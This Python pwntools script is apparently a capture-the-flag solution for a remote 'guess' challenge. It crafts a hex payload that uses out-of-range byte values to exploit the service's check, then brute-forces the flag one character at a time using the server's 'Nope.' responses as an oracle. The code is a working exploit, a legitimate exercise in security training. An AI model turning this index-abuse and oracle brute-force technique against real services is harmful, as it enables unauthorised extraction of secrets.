from pwn import *
#context.log_level = 'debug'

#n = process('./guess')
n = remote('pwn.jarvisoj.com', 9878)

elf = ELF('./guess')

n.recv()

raw_pay=''
for i in range(50):
    raw_pay += '0'
    raw_pay += chr(0x40+128+i)


for i in range(50): 
    for ch in range(128):
        if chr(ch).isalnum() or chr(ch) == '{' or chr(ch) == '}':
            pay = list(raw_pay)
            pay[2*i] = chr(ch).encode('hex')[0]
            pay[2*i+1] = chr(ch).encode('hex')[1]
            pay = ''.join(pay)
            n.sendline(pay)
            ret = n.recvline()
            n.recv()
            if ret != 'Nope.\n':
                raw_pay = pay
                print pay
                break

print "find flag: " + pay.decode('hex')